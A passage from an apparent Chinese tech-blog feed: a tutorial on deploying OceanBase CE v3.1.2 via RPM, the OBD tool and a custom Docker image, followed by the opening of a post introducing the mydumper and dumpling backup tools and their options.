<p>相关代码：<a class="link"   href="https://gitee.com/oceanbase/oceanbase/blob/master/src/observer/ob_server.cpp#L1692" >https://gitee.com/oceanbase/oceanbase/blob/master/src/observer/ob_server.cpp#L1692 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>此报错提示意思为，需要指定数据文件夹，尝试再次启动：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./bin/observer -o cluster_id=1 -z zone1 -d /home/admin/oceanbase/store</span><br></pre></td></tr></table></figure></div>
<p>期间还遇到几处错误，这里暂且按下不表。</p>
<p>综上，第一次启动observer时，需要按spec进行传参，否则会启动失败。<br>
这点其实不是很友好，其实可以设个最小初始值，之后再通过工具或DBA手动进行适配调整，更加智能的话，可以演化为自适应参数。</p>
<h3 id="启动observer-–-正式步骤">启动observer – 正式步骤</h3>
<p>经过上个步骤的若干次测试，得到这样一个配置，可在本地环境启动observer。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -pv store/&#123;slog,clog,ilog,clog_shm,ilog_shm,sstable&#125;</span><br><span class="line">./bin/observer -o cluster_id=1,datafile_size=5G,memory_limit=8G,cache_wash_threshold=1G,__min_full_resource_pool_memory=268435456,system_memory=4G,stack_size=512K,net_thread_count=4,cpu_quota_concurrency=2 -z zone1 -d /home/admin/oceanbase/store</span><br></pre></td></tr></table></figure></div>
<p>使用obclient连接observer</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obclient -S /home/admin/oceanbase/run/mysql.sock -uroot</span><br></pre></td></tr></table></figure></div>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220301-5e0816b3-df55-406d-a71b-4a37b153c0d8.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="清理测试环境">清理测试环境</h3>
<p>删除测试数据，删除已安装的RPM包。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接杀掉进程</span></span><br><span class="line">pidof observer | xargs kill -9</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">删除日志、数据文件</span></span><br><span class="line">rm -rf log/ run/ store/</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移除RPM包</span></span><br><span class="line">yum list installed | grep oceanbase | awk &#x27;&#123;print $1&#125;&#x27; | xargs sudo yum remove -y</span><br></pre></td></tr></table></figure></div>
<p>到此，方法一基本完成。对于本地测试环境来说，略显复杂，还不够简单。<br>
OB团队提供了一个集成工具OBD，可以一键部署OB集群，比RPM安装更方便，下面一起来试验下。</p>
<hr>
<h2 id="二、CentOS-7-9-下使用-OBD-进行安装-OceanBase">二、CentOS 7.9 下使用 OBD 进行安装 OceanBase</h2>
<p>OBD 全称是 OceanBase Deployer，是 OceanBase 社区版的命令行下自动化部署软件。 根据中控机器能否连接公网，提供离线和在线两种安装方法，您可根据实际情况选择安装方式。</p>
<h3 id="Step-1-安装-OBD">Step 1: 安装 OBD</h3>
<p>这里直接用Yum进行安装</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo yum install -y ob-deploy</span><br></pre></td></tr></table></figure></div>
<p>安装完成后，即可正常使用OBD，先来看下仓库情况：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd mirror list</span><br></pre></td></tr></table></figure></div>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20220301-c579be6a-7488-4905-9c22-c44df0c88004.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="Step-2-设定配置文件">Step 2: 设定配置文件</h3>
<p>进入到OB安装目录，并创建配置文件</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/admin/.obd</span><br><span class="line">vi ob_local.yaml</span><br></pre></td></tr></table></figure></div>
<p>示例文件内容如下：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">oceanbase-ce:</span></span><br><span class="line">  <span class="attr">servers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.36</span></span><br><span class="line">  <span class="attr">global:</span></span><br><span class="line">    <span class="attr">home_path:</span> <span class="string">/data/ob/ob_local_data</span></span><br><span class="line">    <span class="attr">datafile_size:</span> <span class="string">10G</span></span><br><span class="line">    <span class="attr">memory_limit:</span> <span class="string">10G</span></span><br><span class="line">    <span class="attr">system_memory:</span> <span class="string">5G</span></span><br><span class="line">    <span class="attr">cpu_count:</span> <span class="number">4</span></span><br></pre></td></tr></table></figure></div>
<h3 id="Step-3-使用OBD部署OB集群">Step 3: 使用OBD部署OB集群</h3>
<p>配置文件设定好之后，就可以使用OBD来部署这个集群。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster deploy cluster-name -c ob_local.yaml</span><br></pre></td></tr></table></figure></div>
<p>执行结果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[admin@centos7 ~]$ obd cluster deploy cluster-name -c ob_local.yaml</span><br><span class="line">oceanbase-ce-3.1.2 already installed.</span><br><span class="line">+-------------------------------------------------------------------------------------------+</span><br><span class="line">|                                          Packages                                         |</span><br><span class="line">+--------------+---------+-----------------------+------------------------------------------+</span><br><span class="line">| Repository   | Version | Release               | Md5                                      |</span><br><span class="line">+--------------+---------+-----------------------+------------------------------------------+</span><br><span class="line">| oceanbase-ce | 3.1.2   | 10000392021123010.el7 | 7fafba0fac1e90cbd1b5b7ae5fa129b64dc63aed |</span><br><span class="line">+--------------+---------+-----------------------+------------------------------------------+</span><br><span class="line">Repository integrity check ok</span><br><span class="line">Parameter check ok</span><br><span class="line">Open ssh connection ok</span><br><span class="line">Remote oceanbase-ce-3.1.2-7fafba0fac1e90cbd1b5b7ae5fa129b64dc63aed repository install ok</span><br><span class="line">Remote oceanbase-ce-3.1.2-7fafba0fac1e90cbd1b5b7ae5fa129b64dc63aed repository lib check ok</span><br><span class="line">Cluster status check ok</span><br><span class="line">Initializes observer work home ok</span><br><span class="line">cluster-name deployed</span><br><span class="line">[admin@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-4-使用OBD启动OB集群">Step 4: 使用OBD启动OB集群</h3>
<p>通过obd可以看到集群状态</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[admin@centos7 ~]$ obd cluster list</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                              Cluster List                              |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br><span class="line">| Name         | Configuration Path                    | Status (Cached) |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br><span class="line">| cluster-name | /home/admin/.obd/cluster/cluster-name | deployed        |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br></pre></td></tr></table></figure></div>
<p>启动集群：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">obd cluster start cluster-name</span><br></pre></td></tr></table></figure></div>
<p>启动后，再查看集群状态，第三列由<code>deployed</code>变为<code>running</code></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[admin@centos7 ~]$ obd cluster list</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                              Cluster List                              |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br><span class="line">| Name         | Configuration Path                    | Status (Cached) |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br><span class="line">| cluster-name | /home/admin/.obd/cluster/cluster-name | running         |</span><br><span class="line">+--------------+---------------------------------------+-----------------+</span><br></pre></td></tr></table></figure></div>
<h3 id="使用-mysql-client-连接-observer">使用 mysql client 连接 observer</h3>
<p>OB兼容mysql协议，所以可用mysql客户端来连接observer</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -S /data/ob/ob_local_data/run/mysql.sock</span><br></pre></td></tr></table></figure></div>
<p>操作记录：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 3221487662</span><br><span class="line">Server version: 5.7.25 OceanBase 3.1.2 (r10000392021123010-d4ace121deae5b81d8f0b40afbc4c02705b7fc1d) (Built Dec 30 2021 02:47:29)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">(root@localhost) [(none)] 11:36:20&gt; show schemas;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| oceanbase          |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| SYS                |</span><br><span class="line">| LBACSYS            |</span><br><span class="line">| ORAAUDITOR         |</span><br><span class="line">| test               |</span><br><span class="line">+--------------------+</span><br><span class="line">7 rows in set (0.003 sec)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看租户信息</span></span><br><span class="line">(root@localhost) [(none)] 11:39:12&gt; select * from oceanbase.gv$tenant;</span><br><span class="line">+-----------+-------------+-----------+--------------+----------------+---------------+-----------+---------------+</span><br><span class="line">| tenant_id | tenant_name | zone_list | primary_zone | collation_type | info          | read_only | locality      |</span><br><span class="line">+-----------+-------------+-----------+--------------+----------------+---------------+-----------+---------------+</span><br><span class="line">|         1 | sys         | zone1     | zone1        |              0 | system tenant |         0 | FULL&#123;1&#125;@zone1 |</span><br><span class="line">+-----------+-------------+-----------+--------------+----------------+---------------+-----------+---------------+</span><br><span class="line">1 row in set (0.009 sec)</span><br></pre></td></tr></table></figure></div>
<p>第二种方法相较于第一种操作更简单，也更便于集群化管理，鉴于OB是分布式数据库，还是建议读者熟悉OBD的各种用法，以及模板文件的参数设定。</p>
<hr>
<h2 id="三、构建Docker版-mini-OceanBase-CE-v3-1-2">三、构建Docker版 mini OceanBase CE v3.1.2</h2>
<p>第三种方法，OceanBase为使用者提供了一个<a class="link"   href="https://hub.docker.com/r/oceanbase/obce-mini" >OB mini docker镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，但是该镜像是基于 OB CE v3.1.0 制成。<br>
下面演示以 OB CE v3.1.2 版本制成docker镜像，并推送到 Docker Hub。</p>
<h3 id="Step-1-确认docker已安装">Step 1: 确认docker已安装</h3>
<p>查看docker服务已运行，并查看版本</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br><span class="line">docker version</span><br></pre></td></tr></table></figure></div>
<p>检查结果如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[admin@centos7 ~]$ systemctl status docker</span><br><span class="line">● docker.service - Docker Application Container Engine</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/docker.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2022-03-01 22:34:59 CST; 54s ago</span><br><span class="line">     Docs: https://docs.docker.com</span><br><span class="line">Main PID: 87672 (dockerd)</span><br><span class="line">    Tasks: 9</span><br><span class="line">   Memory: 27.3M</span><br><span class="line">   CGroup: /system.slice/docker.service</span><br><span class="line">           └─87672 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock</span><br><span class="line">[admin@centos7 ~]$ docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line">Version:           20.10.12</span><br><span class="line">API version:       1.41</span><br><span class="line">Go version:        go1.16.12</span><br><span class="line">Git commit:        e91ed57</span><br><span class="line">Built:             Mon Dec 13 11:45:41 2021</span><br><span class="line">OS/Arch:           linux/amd64</span><br><span class="line">Context:           default</span><br><span class="line">Experimental:      true</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line">Engine:</span><br><span class="line">  Version:          20.10.12</span><br><span class="line">  API version:      1.41 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.16.12</span><br><span class="line">  Git commit:       459d0df</span><br><span class="line">  Built:            Mon Dec 13 11:44:05 2021</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line">containerd:</span><br><span class="line">  Version:          1.4.12</span><br><span class="line">  GitCommit:        7b11cfaabd73bb80907dd23182b9347b4245eb5d</span><br><span class="line">runc:</span><br><span class="line">  Version:          1.0.2</span><br><span class="line">  GitCommit:        v1.0.2-0-g52b36a2</span><br><span class="line">docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br><span class="line">[admin@centos7 ~]$</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-2-准备dockerfile">Step 2: 准备dockerfile</h3>
<p>OB开源代码里已包含了一份<a class="link"   href="https://github.com/oceanbase/oceanbase/blob/master/tools/docker/mini/Dockerfile" >dockerfile <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我们可以直接使用，不过这里简单调整一下，将基础镜像改为<a class="link"   href="https://hub.docker.com/_/centos" >CentOS官方镜像 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><code>centos:centos7</code>，以获取最新版的CentOS镜像。<br>
调整后的dockerfile如下：</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">FROM</span> <span class="string">centos:centos7</span></span><br><span class="line"><span class="string">RUN</span> <span class="string">yum-config-manager</span> <span class="string">--add-repo</span> <span class="string">https://mirrors.aliyun.com/oceanbase/OceanBase.repo</span> <span class="string">&amp;&amp;</span> <span class="string">yum</span> <span class="string">install</span> <span class="string">-y</span> <span class="string">ob-deploy</span> <span class="string">obclient</span> <span class="string">ob-sysbench</span> <span class="string">&amp;&amp;</span> <span class="string">mkdir</span> <span class="string">/root/pkg</span> <span class="string">&amp;&amp;</span> <span class="string">cd</span> <span class="string">/root/pkg</span> <span class="string">&amp;&amp;</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">/usr/obd/mirror/remote/*</span> <span class="string">&amp;&amp;</span> <span class="string">yumdownloader</span> <span class="string">oceanbase-ce</span> <span class="string">oceanbase-ce-libs</span> <span class="string">&amp;&amp;</span> <span class="string">obd</span> <span class="string">mirror</span> <span class="string">clone</span> <span class="string">*rpm</span> <span class="string">&amp;&amp;</span> <span class="string">obd</span> <span class="string">mirror</span> <span class="string">list</span> <span class="string">local</span> <span class="string">&amp;&amp;</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">*</span> <span class="string">&amp;&amp;</span> <span class="string">yum</span> <span class="string">clean</span> <span class="string">all</span></span><br><span class="line"><span class="string">COPY</span> <span class="string">boot</span> <span class="string">/root/boot/</span></span><br><span class="line"><span class="string">ENV</span> <span class="string">PATH</span> <span class="string">/root/boot:$PATH</span></span><br><span class="line"><span class="string">CMD</span> <span class="string">_boot</span></span><br></pre></td></tr></table></figure></div>
<p>这里用到的<code>boot</code>文件夹需要手动下载：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/oceanbase/oceanbase/archive/refs/tags/v3.1.2_CE.zip</span><br><span class="line">unzip v3.1.2_CE.zip</span><br><span class="line">cp -ar oceanbase-3.1.2_CE/tools/docker/mini/boot/ .</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-3-使用dockerfile制成镜像">Step 3: 使用dockerfile制成镜像</h3>
<p>执行下面的命令，生成镜像文件：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker build --rm --no-cache=true -t &quot;shawnyan/obce-mini:v3.1.2_ce&quot; -f dockerfile .</span><br></pre></td></tr></table></figure></div>
<p>构建完成后，检查镜像：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[admin@centos7 obce-mini]$ docker images</span><br><span class="line">REPOSITORY            TAG         IMAGE ID       CREATED         SIZE</span><br><span class="line">shawnyan/obce-mini    v3.1.2_ce   e938aa97e67a   11 minutes ago   755MB</span><br><span class="line">centos                centos7     eeb6ee3f44bd   5 months ago    204MB</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-4-将生成的镜像推送至Docker-Hub">Step 4: 将生成的镜像推送至Docker Hub</h3>
<ol>
<li>登陆用户</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker login</span></span><br><span class="line">Login with your Docker ID to push and pull images from Docker Hub. If you don&#x27;t have a Docker ID, head over to https://hub.docker.com to create one.</span><br><span class="line">Username: my_account</span><br><span class="line">Password:</span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>推送镜像</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker push shawnyan/obce-mini:v3.1.2_ce</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-5-拉取obce-mini镜像，并拉起容器">Step 5: 拉取obce-mini镜像，并拉起容器</h3>
<p>当然可以直接跳过前四步，直接从远端拉取制作好的镜像。<br>
只需简单的几步，即可快速体验OB社区版。</p>
<ul>
<li>启动obce容器</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -p 2881:2881 -v /data/obce:/root/ob --name obce -d shawnyan/obce-mini:v3.1.2_ce</span><br><span class="line">docker logs obce -f</span><br></pre></td></tr></table></figure></div>
<p>稍等片刻就可以看到下面的提示，说明启动成功：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">+---------------------------------------------+</span><br><span class="line">|                   observer                  |</span><br><span class="line">+-----------+---------+------+-------+--------+</span><br><span class="line">| ip        | version | port | zone  | status |</span><br><span class="line">+-----------+---------+------+-------+--------+</span><br><span class="line">| 127.0.0.1 | 3.1.2   | 2881 | zone1 | active |</span><br><span class="line">+-----------+---------+------+-------+--------+</span><br><span class="line">mini-ce running</span><br><span class="line">generate init_tenant.sql ...</span><br><span class="line">init tenant and sysbench database ...</span><br><span class="line">boot success!</span><br></pre></td></tr></table></figure></div>
<p>提示：<br>
需要8G以上内存，磁盘需要5G以上空间，否则会启动失败。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[ERROR] (127.0.0.1) not enough memory. (Free: 4.7G, Need: 8.0G)</span><br><span class="line">[ERROR] (127.0.0.1) / not enough disk space. (Avail: 2.5G, Need: 5.0G)</span><br></pre></td></tr></table></figure></div>
<h3 id="Step-6-连接OB租户">Step 6: 连接OB租户</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过ob-mysql工具连接</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Connect to sys tenant</span></span><br><span class="line">docker exec -it obce ob-mysql sys</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">login as root@sys</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Command is: obclient -h127.1 -uroot@sys -A -Doceanbase -P2881</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Welcome to the OceanBase.  Commands end with ; or \g.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Your MySQL connection <span class="built_in">id</span> is 3221487651</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Server version: 5.7.25 OceanBase 3.1.2 (r10000392021123010-d4ace121deae5b81d8f0b40afbc4c02705b7fc1d) (Built Dec 30 2021 02:47:29)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Connect to the root account of a general tenant</span></span><br><span class="line">docker exec -it obce ob-mysql root</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">login as root@<span class="built_in">test</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Command is: obclient -h127.1 -uroot@<span class="built_in">test</span> -A -Doceanbase -P2881</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Welcome to the OceanBase.  Commands end with ; or \g.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Your MySQL connection <span class="built_in">id</span> is 3221487655</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Server version: 5.7.25 OceanBase 3.1.2 (r10000392021123010-d4ace121deae5b81d8f0b40afbc4c02705b7fc1d) (Built Dec 30 2021 02:47:29)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或，通过mysql客户端连接</span></span><br><span class="line">mysql -uroot -h127.1 -P2881 -c</span><br></pre></td></tr></table></figure></div>
<h2 id="相关资料">相关资料</h2>
<ul>
<li><a class="link"   href="https://www.modb.pro/db/327631" >OceanBase 技术征文大赛第二期正式开启！快来释放你的原力！ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2021/oceanbase-obcp-v2-exam/">OceanBase OBCP 考试经验小结</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-compile-observer/">【OBCP蓝宝书】 基于 CentOS 7.9 编译 OceanBase 社区版 v3.1.2 的 observer 源码</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-perf-testing-with-databench-t/">OB测试 | 使用 Databench-T 对 OceanBase 社区版 v3.1.2 进行性能测试</a></li>
<li><a href="https://shawnyan.cn/2022/oceanbase/ob-v3.1.2-sql-explain/">OB练习 | 查看 OceanBase 执行计划</a></li>
<li><a class="link"   href="https://github.com/oceanbase/oceanbase/tree/master/tools/docker/mini" >https://github.com/oceanbase/oceanbase/tree/master/tools/docker/mini <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://hub.docker.com/r/oceanbase/obce-mini" >https://hub.docker.com/r/oceanbase/obce-mini <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<p><strong>Voila, Enjoy OB!</strong></p>
<p>ShawnYan<br>
2022-03-01</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/336394" >https://www.modb.pro/db/336394 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>OceanBase</category>
        <category>OB v3</category>
      </categories>
      <tags>
        <tag>oceanbase</tag>
        <tag>obcp</tag>
        <tag>install</tag>
        <tag>oceanbase 社区版</tag>
        <tag>ob v3</tag>
      </tags>
  </entry>
  <entry>
    <title>温故知新 | mydumper &amp; dumpling 知识点汇总</title>
    <url>/2022/tidb/mydumper-and-dumpling/</url>
    <content><![CDATA[<p>“温故知新”系列，是指重新整理汇总那些有用但可能平时用不到的知识点，同时发掘、学习新的知识点以丰富知识体系。<br>
本文主要阐释 <code>mydumper</code> 和 <code>dumpling</code> 工具的相关概念、使用方法，及其与TiDB的关联。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="/img/tidb/mydumper.png"
                     
                >
<p>前置信息：</p>
<blockquote>
<p>CentOS Linux release 7.9.2009 (Core)<br>
MySQL 5.7.37<br>
TiDB v5.4.0<br>
mydumper v0.11.5-2<br>
mydumper v0.9.5 with PingCAP customization<br>
dumpling v5.4.0</p>
</blockquote>
<h2 id="mydumper-简介">mydumper 简介</h2>
<p><code>mydummper</code>是一个第三方工具，用来备份 MySQL（MariaDB、Percona）数据库。</p>
<h3 id="缘起">缘起</h3>
<blockquote>
<p>The mydumper project was started at the beginning of 2009 by Domas Mituzas, and a few months ago we started collaborating and adding new features to improve performance and usability.</p>
</blockquote>
<p>via. Percona Blog.</p>
<h3 id="特性">特性</h3>
<ol>
<li>支持多线程导出数据，速度更快。</li>
<li>支持一致性备份。</li>
<li>支持将导出文件压缩，节约空间。</li>
<li>支持多线程恢复。</li>
<li>支持以守护进程模式工作，定时快照和连续二进制日志。</li>
<li>支持按照指定大小将备份文件切割。</li>
<li>数据与建表语句分离。</li>
<li>比mysqldump速度快。</li>
</ol>
<h3 id="代码">代码</h3>
<p>最新版代码库：</p>
<ul>
<li>官方库：<a class="link"   href="https://github.com/mydumper/mydumper" >https://github.com/mydumper/mydumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>PingCAP定制版：<a class="link"   href="https://github.com/pingcap/mydumper" >https://github.com/pingcap/mydumper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h3 id="安装">安装</h3>
<p>这里介绍两种安装方式：1. RPM安装；2. 源码编译安装</p>
<ol>
<li>RPM安装</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum install -y https://github.com/mydumper/mydumper/releases/download/v0.11.5-2/mydumper-0.11.5-2.el7.x86_64.rpm</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mydumper --version</span></span><br><span class="line">mydumper 0.11.5, built against MySQL 5.7.34-37</span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>源码编译安装</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># yum install -y cmake gcc gcc-c++ git make</span><br><span class="line"># yum install -y glib2-devel mysql-devel openssl-devel pcre-devel zlib-devel libzstd-devel</span><br><span class="line"># yum install -y MariaDB-devel</span><br><span class="line"># wget https://github.com/mydumper/mydumper/archive/refs/tags/v0.11.5-2.zip</span><br><span class="line"># unzip v0.11.5-2.zip</span><br><span class="line"># cd mydumper-0.11.5-2/</span><br><span class="line"># cmake .</span><br><span class="line"># make</span><br><span class="line"># make install</span><br><span class="line">-- Installing: /usr/local/bin/mydumper</span><br><span class="line">-- Installing: /usr/local/bin/myloader</span><br><span class="line"># mydumper --version</span><br><span class="line">mydumper 0.11.5, built against MySQL 5.7.37</span><br></pre></td></tr></table></figure></div>
<h2 id="mydumper-使用方法">mydumper 使用方法</h2>
<h3 id="重要选项">重要选项</h3>
<p>摘取了一些重要的选项，列举如下：</p>
<table>
<thead>
<tr>
<th>Options</th>
<th>Desc</th>
</tr>
</thead>
<tbody>
<tr>
<td>-B, --database</td>
<td>导出的源库</td>
</tr>
<tr>
<td>-T, --tables-list</td>
<td>导出的表，以逗号分隔（不排除正则选项）</td>
</tr>
<tr>
<td>-o, --outputdir</td>
<td>输出文件到目标目录</td>
</tr>
<tr>
<td>-F, --chunk-filesize</td>
<td>将表按指定块大小（单位为MB）拆分成若干文件</td>
</tr>
<tr>
<td>-c, --compress</td>
<td>压缩输出文件</td>
</tr>
<tr>
<td>-x, --regex</td>
<td>正则表达式去匹配 ‘db.table’</td>
</tr>
<tr>
<td>-m, --no-schemas</td>
<td>只备份表数据，不备份表结构</td>
</tr>
<tr>
<td>-d, --no-data</td>
<td>不备份表数据</td>
</tr>
<tr>
<td>-k, --no-locks</td>
<td>不执行临时共享读锁。警告：这将导致不一致的备份</td>
</tr>
<tr>
<td>-t, --threads</td>
<td>使用的线程数，默认值为4</td>
</tr>
<tr>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td>–sync-wait</td>
<td>WSREP_SYNC_WAIT value to set at SESSION level</td>
</tr>
<tr>
<td>–</td>
<td>–</td>
</tr>
<tr>
<td>-z, --tidb-snapshot</td>
<td>Snapshot to use for TiDB</td>
</tr>
</tbody>
</table>
<p>注：</p>
<ul>
<li><a href="https://docs.pingcap.com/zh/tidb/v4.0/mydumper-overview#%E6%96%B0%E6%B7%BB%E5%8F%82%E6%95%B0"><code>-z 或 --tidb-snapshot</code></a>: 设置 tidb_snapshot 用于备份。默认值为当前 TSO（SHOW MASTER STATUS 输出的 Position 字段）。此参数可设为 TSO 或有效的 datetime 时间，例如：-z “2016-10-08 16:45:26”。</li>
<li><a href="https://pingcap.com/zh/blog/tidb-as-mysql-slave"><code>--no-locks</code></a>: 在阿里云一些需要 super privilege 的云上面，mydumper 需要加上 --no-locks 参数，否则会提示没有权限操作。</li>
</ul>
<h3 id="常用备份命令">常用备份命令</h3>
